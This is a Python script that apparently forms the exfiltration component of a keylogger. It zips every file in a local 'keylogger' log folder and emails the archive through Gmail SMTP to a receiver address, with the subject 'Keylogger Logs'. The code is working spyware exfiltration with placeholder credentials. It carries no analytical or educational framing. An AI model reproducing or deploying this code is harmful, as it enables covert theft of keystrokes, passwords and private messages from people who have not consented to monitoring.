import yagmail
import os
from datetime import datetime
import zipfile

# Email setup
SENDER_EMAIL = "keylogger.sender@gmail.com"
SENDER_PASS  = "your-app-password-here"
RECEIVER     = "your.email@example.com"

# Paths
LOG_DIR = r"C:\Users\asus\keylogger"
ZIP_PATH = os.path.join(LOG_DIR, f"logs_{datetime.now().strftime('%Y%m%d_%H%M')}.zip")

# Zip all files in the log folder
def zip_logs():
    with zipfile.ZipFile(ZIP_PATH, 'w') as zipf:
        for file in os.listdir(LOG_DIR):
            full_path = os.path.join(LOG_DIR, file)
            if os.path.isfile(full_path) and file != os.path.basename(ZIP_PATH):
                zipf.write(full_path, arcname=file)

# Send email
def send_email():
    try:
        zip_logs()
        yag = yagmail.SMTP(SENDER_EMAIL, SENDER_PASS)
        yag.send(to=RECEIVER, subject="📤 Keylogger Logs", contents="Attached logs.", attachments=ZIP_PATH)
        print("[+] Logs sent.")
    except Exception as e:
        print(f"[!] Email failed: {e}")
